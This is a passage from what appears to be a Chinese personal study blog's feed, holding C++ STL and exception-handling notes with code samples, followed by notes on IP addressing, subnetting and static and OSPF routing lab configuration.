     it++;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;--------------------&quot;</span>;</span><br><span class="line">    <span class="comment">//第二种遍历方式</span></span><br><span class="line">    <span class="keyword">for</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;::iterator it = vt.<span class="built_in">begin</span>();it!=vt.<span class="built_in">end</span>();it++)</span><br><span class="line">        <span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator itb = (*it).<span class="built_in">begin</span>();itb!=(*it).<span class="built_in">end</span>();itb++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;*itb;</span><br><span class="line">        &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;--------------------&quot;</span>;</span><br><span class="line">    <span class="comment">//第三种方式</span></span><br><span class="line">    for_each(vt.<span class="built_in">begin</span>(),vt.<span class="built_in">end</span>(),printvector);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>vector构造函数</strong><br><strong>vector<T> ; &#x2F;&#x2F;默认构造</T></strong><br><strong>vector(v.begin(),v.end()) &#x2F;&#x2F;将v[begin(),end())区间中的元素拷贝给自身</strong><br><strong>vector(n,elem)    &#x2F;&#x2F;构造函数将n个elem拷贝给自身</strong><br><strong>vector(const vector &amp;vec)    &#x2F;&#x2F;拷贝构造函数</strong><br><strong>​</strong><br><strong>vector赋值操作</strong><br><strong>vector&amp; operator&#x3D;(const vector &amp;vec)  &#x2F;&#x2F;重载&#x3D;操作符</strong><br><strong>assign(beg,end)   &#x2F;&#x2F;将[beg,end)区间中的数据拷贝给自身</strong><br><strong>assign(n,elem)   &#x2F;&#x2F;将n个elem拷贝给自身</strong><br><strong>​</strong><br><strong>vector插入与删除</strong><br><strong>push_back(ele)       &#x2F;&#x2F;尾部插入元素</strong><br><strong>pop_back()            &#x2F;&#x2F;删除最后一个元素</strong><br><strong>insert(const_iterator pos ,ele)    &#x2F;&#x2F;迭代器指向位置pos插入元素</strong><br><strong>erase(const_iterator pos)   &#x2F;&#x2F;删除迭代器指向的元素</strong><br><strong>erase(const_iterator start,const_iterator end)  &#x2F;&#x2F;删除迭代器从strat到end之间的元素</strong><br><strong>clear（） &#x2F;&#x2F;删除容器中所有的元素</strong><br><strong>​</strong><br><strong>vector数据存取</strong><br><strong>at(int idx)    &#x2F;&#x2F;返回索引idx所指的数据</strong><br><strong>operator[]   &#x2F;&#x2F;返回索引idx所指的数据</strong><br><strong>front()   &#x2F;&#x2F;返回容器中第一个元素</strong><br><strong>back()   &#x2F;&#x2F;返回容器中最后一个元素</strong><br><strong>​</strong><br><strong>vector互换容器</strong><br><strong>swap(vec)    &#x2F;&#x2F;将vec与本身的元素互换</strong><br><strong>​</strong><br><strong>vector预留空间</strong><br><strong>减少vector在动态扩展容量时的扩展次数</strong><br><strong>reserve(int len)  &#x2F;&#x2F;容器预留len个元素长度，预留位置不初始化。元素不可访问</strong><br><strong>​</strong><br><strong>string基本概念</strong><br><strong>string构造函数</strong><br><strong>string()；       &#x2F;&#x2F;创建一个空的字符串，例如string str</strong><br><em><em>string(const char</em> s);   &#x2F;&#x2F;使用字符串s初始化</em>*<br><strong>string(const string &amp;str);   &#x2F;&#x2F;使用一个string对象初始化另一个string对象</strong><br><strong>string(int n ,char c);    &#x2F;&#x2F;使用n个字符c初始化</strong><br><strong>​</strong><br><strong>string复制操作</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string str,str1;</span><br><span class="line">str = <span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;nihao&quot;</span>;</span><br><span class="line"></span><br><span class="line">str = str1;</span><br><span class="line">str.<span class="built_in">assign</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">str.<span class="built_in">assign</span>(<span class="string">&quot;hello world&quot;</span>,<span class="number">5</span>);</span><br></pre></td></tr></table></figure><p><strong>string字符串拼接</strong><br><em><em>string&amp; operator+&#x3D;(const char</em> str)  &#x2F;&#x2F;重载+&#x3D;操作符</em>*<br><strong>string&amp; operator+&#x3D;(const char c)     &#x2F;&#x2F;重载+&#x3D;操作符</strong><br><strong>string&amp; operator+&#x3D;(const string&amp; str)  &#x2F;&#x2F;重载+&#x3D;操作符</strong><br>*<em>string&amp; append(const char <em>s) &#x2F;&#x2F;把字符串s连接到当前字符串结尾</em></em><br>*<em>string&amp; append(const char <em>s,int n) &#x2F;&#x2F;把字符串s的前n个字符串链接到当前字符串结尾</em></em><br><strong>string&amp; append(const string&amp;s)  &#x2F;&#x2F;同operator+&#x3D;(const string&amp; str)</strong><br><strong>string&amp; append(const string&amp;s, int pos ,int n)  &#x2F;&#x2F;把字符串s中从pos开始的n个字符串连接到字符串结尾</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    string&amp; operator+=(const char* str)  //重载+=操作符</span></span><br><span class="line">      string s = <span class="string">&quot;I&quot;</span>;</span><br><span class="line">      s+=<span class="string">&quot;play games&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    string&amp; operator+=(const char c)     //重载+=操作符</span></span><br><span class="line">      s+=<span class="string">&#x27;L&#x27;</span>;</span><br><span class="line"><span class="comment">//    string&amp; operator+=(const string&amp; str)  //重载+=操作符</span></span><br><span class="line">       string s1=<span class="string">&quot;LOL&quot;</span>;</span><br><span class="line">       s+=s1;</span><br><span class="line"><span class="comment">//    string&amp; append(const char *s) //把字符串s连接到当前字符串结尾</span></span><br><span class="line">       s.<span class="built_in">append</span>(<span class="string">&quot;ggg&quot;</span>);</span><br><span class="line"><span class="comment">//    string&amp; append(const char *s,int n) //把字符串s的前n个字符串链接到当前字符串结尾</span></span><br><span class="line">       s.<span class="built_in">append</span>(<span class="string">&quot;aaa&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//    string&amp; append(const string&amp;s)  //同operator+=(const string&amp; str)</span></span><br><span class="line">       s.<span class="built_in">append</span>(s1);</span><br><span class="line">       <span class="comment">//    string&amp; append(const string&amp;s, int pos ,int n)  //把字符串s中从pos开始的n个字符串连接到字符串结尾</span></span><br><span class="line">       s.<span class="built_in">append</span>(s1,<span class="number">0</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><strong>string字符串比较</strong><br><strong>字符串之间的比较（比较ASCII码）</strong><br><em><em>int compare(const cha</em> s)</em>*<br><strong>&#x3D; 0</strong><br><strong>&gt;1</strong><br><strong>​</strong><br><strong>string 字符存取</strong><br><strong>string中单个字符串存取方式有两种</strong><br><strong>char&amp; operator[](int n)  &#x2F;&#x2F;通过[]方式取字符串</strong><br><strong>char&amp; at(int n)   &#x2F;&#x2F;通过at方法获取字符串</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;helo world&quot;</span>;</span><br><span class="line"><span class="comment">//    char&amp; operator[](int n)  //通过[]方式取字符串</span></span><br><span class="line">    cout &lt;&lt; str[<span class="number">3</span>];</span><br><span class="line"><span class="comment">//    char&amp; at(int n)   //通过at方法获取字符串</span></span><br><span class="line">    cout &lt;&lt; str.<span class="built_in">at</span>(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p><strong>​</strong><br><strong>string插入和删除 insert() erase()</strong><br><strong>string子串  substr()</strong><br><strong>​</strong><br><strong>​</strong><br><strong>​</strong><br>c++STL(deque)<strong>deque容器</strong><br><strong>双端数组，可以对头端进行插入删除操作</strong><br><strong>deque与vector区别</strong><br><strong>vector对于头部的插入删除效率低，数据量大，效率更低</strong><br><strong>deque相对而言，对头部的插入删除速度比vector快</strong><br><strong>vector访问元素数据会比deque快</strong><br><strong>​</strong><br><strong>deque排序</strong><br><strong>sort(iterator beg,iterator end)</strong><br>c++STL(stack  queue)<strong>构造函数</strong><br>**stack<T> stk    **<br><strong>stack(const stack &amp;stk)</strong><br>赋值操作<br><strong>stack&amp; operator&#x3D;(const stack &amp;stk)</strong><br><strong>数据存取</strong><br><strong>push(elem)   &#x2F;&#x2F;入栈</strong><br><strong>pop()          &#x2F;&#x2F;从栈顶移除第一格元素</strong><br><strong>top()          &#x2F;&#x2F;返回栈顶元素</strong><br><strong>大小操作</strong><br><strong>empty()    &#x2F;&#x2F;判断栈是否为空</strong><br><strong>size()     &#x2F;&#x2F;返回栈的大小</strong><br><strong>​</strong><br><strong>​</strong><br><strong>queue队列</strong><br><strong>构造函数</strong><br>**queue<T> que    **<br><strong>queue(const queue &amp;que)</strong><br><strong>赋值操作</strong><br><strong>queue&amp; operator&#x3D;(const queue &amp;que)</strong><br><strong>数据存取</strong><br><strong>push(elem)    &#x2F;&#x2F;队尾添加元素</strong><br><strong>pop()      &#x2F;&#x2F;从队头移除第一个元素</strong><br><strong>back()    &#x2F;&#x2F;返回最后一个元素</strong><br><strong>front()   &#x2F;&#x2F;返回第一个元素</strong><br><strong>大小操作</strong><br><strong>empty()   &#x2F;&#x2F;判断队是否为空</strong><br><strong>size()     &#x2F;&#x2F;返回队的大小</strong><br>c++STL(list)<strong>list容器</strong><br><strong>构造函数</strong><br><strong>list<T> list</T></strong><br>**list(beg,end)   **<br><strong>list(n,elem)</strong><br><strong>list(const list &amp;lst)</strong><br><strong>​</strong><br><strong>插入与删除</strong><br><strong>remove(elem)   &#x2F;&#x2F;删除容器中所有与elem值匹配的元素</strong><br><strong>​</strong><br><strong>反转与排序</strong><br><strong>reverse()   &#x2F;&#x2F;反转链表</strong><br><strong>sort()       &#x2F;&#x2F;链表排序</strong><br><strong>​</strong><br>c++STL(set map)<strong>set容器</strong><br><strong>简介：所有元素都会在插入时自动被排序</strong><br><strong>本质：set&#x2F;multiset属于关联式容器，底层结构是二叉树</strong><br><strong>set与multiset区别</strong><br><strong>set不允许容器中有重复的元素</strong><br><strong>multiset允许容器中有重复的元素</strong><br><strong>​</strong><br><strong>set插入只有insert方式</strong><br><strong>​</strong><br><strong>删除数据</strong><br><strong>clear()   &#x2F;&#x2F;删除容器中所有的元素</strong><br><strong>erase(pos)   &#x2F;&#x2F;删除pos迭代器所指的元素，返回下一个元素的迭代器</strong><br><strong>erase(beg,end)  &#x2F;&#x2F;删除区间[beg，end)的所有元素，返回下一个元素的迭代器</strong><br><strong>erase(elem)  &#x2F;&#x2F;删除容器中值为elem的元素</strong><br><strong>​</strong><br><strong>查找与统计</strong><br><strong>find(key)   &#x2F;&#x2F;查找key是否存在，如存在，返回该键的元素的迭代器。若不存在，返回set.end()</strong><br><strong>count(key)  &#x2F;&#x2F;统计key的元素个数</strong><br><strong>​</strong><br><strong>pair对组创建</strong><br><strong>成对出现得数据，利用对组可以返回两个数据</strong><br><strong>两种创建方式</strong><br><strong>pair&lt;type ,type&gt; p(value1,value2);</strong><br><strong>pair&lt;type,type&gt; p &#x3D; make_pair(value1,value2);</strong><br><strong>​</strong><br><strong>set中插入自定义类型</strong><br><strong>需要仿函数来声明排序规则</strong></T></T></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">set&lt;person&gt; s;</span><br><span class="line">vector&lt;person&gt; v;</span><br><span class="line">deque&lt;<span class="type">float</span>&gt; de;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    string name;</span><br><span class="line">    <span class="type">int</span> sore;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">person</span>(string name, <span class="type">int</span> sore);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person::<span class="built_in">person</span>(string name, <span class="type">int</span> sore) &#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">    <span class="keyword">this</span>-&gt;sore = sore;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">compare</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> person &amp;p, <span class="type">const</span> person &amp;p1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.sore &gt; p1.sore;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    set&lt;person, compare&gt; s1;</span><br><span class="line">    <span class="function">person <span class="title">p1</span><span class="params">(<span class="string">&quot;curry&quot;</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="function">person <span class="title">p2</span><span class="params">(<span class="string">&quot;kd&quot;</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line">    <span class="function">person <span class="title">p3</span><span class="params">(<span class="string">&quot;james&quot;</span>, <span class="number">38</span>)</span></span>;</span><br><span class="line">    <span class="function">person <span class="title">p4</span><span class="params">(<span class="string">&quot;kof&quot;</span>, <span class="number">89</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    s1.<span class="built_in">insert</span>(p1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>map&#x2F;multimap容器</strong><br><strong>map中所有元素都是pair</strong><br><strong>pair中第一个为key起到索引作用，第二个元素为value</strong><br><strong>所有元素都会根据元素的键值自动排序</strong><br><strong>本质：属于关联式容器，底层结构是二叉树</strong><br><strong>​</strong><br><strong>构造函数</strong><br><strong>map&lt;key,value&gt; m;</strong><br><strong>map(const map&amp; m)</strong><br>c++STL函数对象<strong>函数对象</strong><br><strong>重载函数调用操作符的类，其对象称为函数对象</strong><br><strong>函数对象是用重载的（）时，行为类似函数调用，也叫仿函数</strong><br><strong>​</strong><br><strong>本质：函数对象是一个类，不是一个函数</strong><br><strong>​</strong><br><strong>返回值是boo类型，称为谓词</strong><br><strong>一元谓词</strong><br><strong>​</strong><br>c++异常c语言处理异常的方法的缺陷<br><strong>返回值意思不明确</strong><br><strong>返回值只能返回一条信息</strong><br><strong>返回值可以忽略</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="number">10</span>;<span class="comment">//抛出一个int类型异常</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//把可能出现异常的代码放在try中</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">catch</span>（<span class="type">int</span>）<span class="comment">//接收int类型的异常</span></span><br><span class="line">&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;接收int类型的异常&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>异常的接口声明</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">()</span> <span class="title">throw</span><span class="params">(<span class="type">int</span> ,<span class="type">char</span>)</span> <span class="comment">//规定该函数只能抛出限定类型的异常</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p><strong>栈解旋</strong><br><strong>在抛出异常的函数中，如果抛出异常之后，但函数没有结束，这时，栈上申请的对象都会被释放</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">make</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">make</span>() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;make构造函数&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">make</span>() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;make析构函数&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    make m;</span><br><span class="line">    <span class="keyword">throw</span> m;<span class="comment">//m是make拷贝一份的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">test01</span>();</span><br><span class="line">    &#125; <span class="built_in">catch</span> (make) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;接收make类型的异常&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>异常对象的生命周期</strong><br><strong>异常的多态</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//异常基类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">printM</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SonNULL</span> : <span class="keyword">public</span> Father &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printM</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;空指针异常&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SonOut</span> : <span class="keyword">public</span> Father &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printM</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;溢出异常&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//throw SonNULL();</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="built_in">SonOut</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">test01</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (Father &amp;f) &#123;</span><br><span class="line">        f.<span class="built_in">printM</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络通信与互联</title>
      <link href="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/"/>
      <url>/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/</url>
      
        <content type="html"><![CDATA[<p> tcp&#x2F;ip模型  </p><ul><li>应用层</li><li>传输层</li><li>网络层</li><li>数据链路层</li><li>物理层Ip地址A类地址 0.0.0.0<del>127.255.255.255<br>B 类地址128.0.0.0</del>191.255.255.255<br>C类地址 192.0.0.0<del>223.255.255.255<br>私有地址即不能访问外网<br>10.0.0.0</del>10.255.255.255<br>172.16.0.0<del>172.31.255.255<br>192.168.0.0</del>192.168.255.55<br>CIDR(无分类地址)<br>路由聚合<br>172.168.10.0&#x2F;24<br>172.168.11.0&#x2F;24<br>172.168.12.0&#x2F;24<br>三个子网中相同部分为172.168<br>对比后面的<br>00001010<br>00001011<br>00001100<br>所以从1处开始划分，00001 000.0聚合之后为172.168.8.0&#x2F;21<br>避免路由环路 ip router-static 目标地址  NULL0<br> ip子网划分</li></ul><hr><p>ip地址由“网络号+主机号”，共32位，其中A类地址网络号为8位，B类地址网络号为16位，C类地址网络号为24位。<br>子网划分是通过借用主机号来划分多个子网来实现不同场合应用，其中子网掩码是通过网络号位数与借用的主机号位数来确定</p><p> 网络互联   若链接网络的设备处于同一个网段则两者之间可以通过交换机进行通信，若不处于一个网段则需要通过路由器来进行相应的链接。  </p><p> 路由协议<br> 实验1:通过修改路由表来实现不同网段的通信设备互联  （静态路由）1. 首先有两台主机ip分别是192.168.10.1&#x2F;24与172.16.1.1&#x2F;16 ，还有一台远程主机ip为10.10.10.1&#x2F;24 ，通过路由器来实现上述三台主机之间的互通<br> **步骤一：上述主机的拓扑图如下  **<br><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1682343800606-de632607-446c-405b-8291-0b9327eea5f2.png" alt="1682343800606-de632607-446c-405b-8291-0b9327eea5f2"></p><p><strong>步骤二：由于PC1与PC2处于不同的网段所以需要通过路由器来实现互联，因此手动修改路由信息，如下图所示</strong><br><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1682344615453-41a4ec76-dee0-4c03-b042-698902707607.png" alt="1682344615453-41a4ec76-dee0-4c03-b042-698902707607"></p><p>通过修改R1的接口实现了PC1与PC2的通信</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//对于pc1接口</span><br><span class="line">interface e0/0/0</span><br><span class="line">ip address 192.168.1.254 24</span><br><span class="line">//对于pc2接口</span><br><span class="line">interface E0/0/1</span><br><span class="line">ip address  172.16.1.254 16</span><br></pre></td></tr></table></figure><p>步骤三：通过设置静态路由实现教学楼A与教学楼B主机之间的通信，如下图<br>1.首先设置R2的pc3接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">interface e0/0/0</span><br><span class="line">ip address 10.10.10.254 24</span><br></pre></td></tr></table></figure><p>2.设置两个路由器之间得接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//R1</span><br><span class="line">interface g0/0/0</span><br><span class="line">ip address 11.1.1.1 30</span><br><span class="line">//R2</span><br><span class="line">interface  g0/0/1</span><br><span class="line">ip address 11.1.1.2 30</span><br></pre></td></tr></table></figure><p>3.设置静态路由使得教学楼主机发送的数据包可以通过路由器R1进行转发到R2再转发到教学楼B的主机上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//R1</span><br><span class="line">ip route-static 10.10.10.0 24 11.1.1.2   #其中10.10.10.0 为网络地址其他地方同此</span><br><span class="line">//R2</span><br><span class="line">ip route-static 192.168.1.0 24 11.1.1.1 </span><br><span class="line">ip route-static 172.16.1.0 24 11.1.1.1 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1682347985902-86a7ae6f-f2d6-4a92-9799-0c5356c94105.png" alt="1682347985902-86a7ae6f-f2d6-4a92-9799-0c5356c94105"></p><p>缺省路由（默认路由） 0.0.0.0 0  下一跳地址</p><p>路由优先级设置（浮动路由）1.若两个路由之间有两条链路，请设置一个主路由和一个备份路由（两条链路的优先级是一样的）<br><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1682393581835-0db417ec-6ee1-4594-979e-3af2c86673c9.png" alt="1682393581835-0db417ec-6ee1-4594-979e-3af2c86673c9"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//设置如下，规定11.1.1.1 11.1.1.2 为主链路</span><br><span class="line">ip route-static  10.10.10.0 24 21.1.1.2 preference 100 #降低21.1.1.2链路的优先级</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1682393887265-582d0b8a-3626-4bce-bd1e-b60fb6d2b671.png" alt="1682393887265-582d0b8a-3626-4bce-bd1e-b60fb6d2b671"></p><p><img src="/2024/03/13/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8E%E4%BA%92%E8%81%94/1682393792886-0ecdb7fa-ecd9-4fae-b7cc-c81422b74419.png" alt="1682393792886-0ecdb7fa-ecd9-4fae-b7cc-c81422b74419"></p><p>对比可以看到21.1.1.2不在显示，作为备份链路，同理R4也是一样<br>动态路由（ospf）<br>为什么要使用动态路由协议？<br>1.无法适应规模较大的网络<br>2.无法动态响应网络变化<br>动态路由分类：<br>按工作区域划分：IGP(内部网关协议) EGP(外部网关协议)<br>按工作机制划分：距离矢量路由协议，链路状态路由协议<br>​<br>ospf工作原理：<br>ospf area： 将一个网络划分多个区域，减轻泛洪<br>router-id： 唯一标识一个路由器<br>度量值(cost)： 每一个激活了ospf接口都会维护一个cost值，不同于路径开销，路径开销指的沿途经过的链路cost累积和<br>ospf协议报文类型<br>1.hello 周期性发送，用来发现和维护ospf邻居关系<br>2.Databse Description 描述本地LSDB的摘要信息，用于两台设备进行数据同步<br>3.Link State Request 